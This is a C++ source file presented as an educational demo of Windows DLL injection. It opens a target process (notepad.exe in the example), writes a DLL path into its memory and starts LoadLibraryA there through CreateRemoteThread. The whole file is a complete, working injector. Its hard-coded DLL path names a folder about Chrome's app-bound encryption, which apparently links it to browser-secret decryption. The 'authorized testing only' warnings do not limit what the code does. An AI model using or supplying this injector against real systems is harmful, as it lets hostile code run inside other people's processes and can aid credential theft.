// Simple DLL Injection Demo - Educational Purpose Only
// WARNING: Only use for learning and authorized testing!

#include <Windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

class SimpleDllInjector {
private:
    DWORD FindProcessByName(const std::wstring& processName) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            return 0;
        }

        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);

        if (Process32FirstW(hSnapshot, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, processName.c_str()) == 0) {
                    CloseHandle(hSnapshot);
                    return pe.th32ProcessID;
                }
            } while (Process32NextW(hSnapshot, &pe));
        }

        CloseHandle(hSnapshot);
        return 0;
    }

public:
    bool InjectDLL(const std::wstring& processName, const std::string& dllPath) {
        std::wcout << L"[*] Searching for process: " << processName << std::endl;
        
        // 1. Find target process
        DWORD processId = FindProcessByName(processName);
        if (processId == 0) {
            std::wcout << L"[-] Process not found!" << std::endl;
            return false;
        }
        
        std::wcout << L"[+] Found process ID: " << processId << std::endl;

        // 2. Open target process
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
        if (hProcess == NULL) {
            std::wcout << L"[-] Failed to open process. Error: " << GetLastError() << std::endl;
            return false;
        }

        std::wcout << L"[+] Process opened successfully" << std::endl;

        // 3. Allocate memory in target process for DLL path
        SIZE_T dllPathSize = dllPath.length() + 1;
        LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, dllPathSize, 
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (pDllPath == NULL) {
            std::wcout << L"[-] Failed to allocate memory. Error: " << GetLastError() << std::endl;
            CloseHandle(hProcess);
            return false;
        }

        std::wcout << L"[+] Memory allocated at: 0x" << std::hex << pDllPath << std::dec << std::endl;

        // 4. Write DLL path to target process
        SIZE_T bytesWritten;
        if (!WriteProcessMemory(hProcess, pDllPath, dllPath.c_str(), dllPathSize, &bytesWritten)) {
            std::wcout << L"[-] Failed to write memory. Error: " << GetLastError() << std::endl;
            VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        std::wcout << L"[+] DLL path written to target memory" << std::endl;

        // 5. Get LoadLibraryA address
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        if (hKernel32 == NULL) {
            std::wcout << L"[-] Failed to get kernel32.dll handle" << std::endl;
            VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
        if (pLoadLibrary == NULL) {
            std::wcout << L"[-] Failed to get LoadLibraryA address" << std::endl;
            VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        std::wcout << L"[+] LoadLibraryA address: 0x" << std::hex << pLoadLibrary << std::dec << std::endl;

        // 6. Create remote thread to load DLL
        HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary, pDllPath, 0, NULL);
        if (hRemoteThread == NULL) {
            std::wcout << L"[-] Failed to create remote thread. Error: " << GetLastError() << std::endl;
            VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        std::wcout << L"[+] Remote thread created successfully" << std::endl;

        // 7. Wait for thread completion
        WaitForSingleObject(hRemoteThread, 5000);
        
        // 8. Get thread exit code (HMODULE of loaded DLL)
        DWORD exitCode;
        GetExitCodeThread(hRemoteThread, &exitCode);
        
        if (exitCode != 0) {
            std::wcout << L"[+] DLL loaded at: 0x" << std::hex << exitCode << std::dec << std::endl;
        } else {
            std::wcout << L"[-] DLL loading failed" << std::endl;
        }

        // 9. Cleanup
        CloseHandle(hRemoteThread);
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);

        return exitCode != 0;
    }
};

int main() {
    std::wcout << L"=== Simple DLL Injection Demo ===" << std::endl;
    std::wcout << L"WARNING: Educational purpose only!" << std::endl;
    std::wcout << L"Only use on your own systems!" << std::endl << std::endl;

    // Example usage
    SimpleDllInjector injector;
    
    // Target: Notepad (safe for testing)
    std::wstring targetProcess = L"notepad.exe";
    
    // DLL to inject (current directory)
    std::string dllPath = "D:\\hacker\\Chrome-App-Bound-Encryption-Decryption\\demo\\test_dll.dll";
    
    std::wcout << L"[*] Make sure notepad.exe is running and test.dll exists" << std::endl;
    std::wcout << L"[*] Press Enter to continue or Ctrl+C to exit..." << std::endl;
    std::cin.get();

    if (injector.InjectDLL(targetProcess, dllPath)) {
        std::wcout << L"[+] Injection successful!" << std::endl;
    } else {
        std::wcout << L"[-] Injection failed!" << std::endl;
    }

    std::wcout << L"Press Enter to exit..." << std::endl;
    std::cin.get();
    return 0;
}
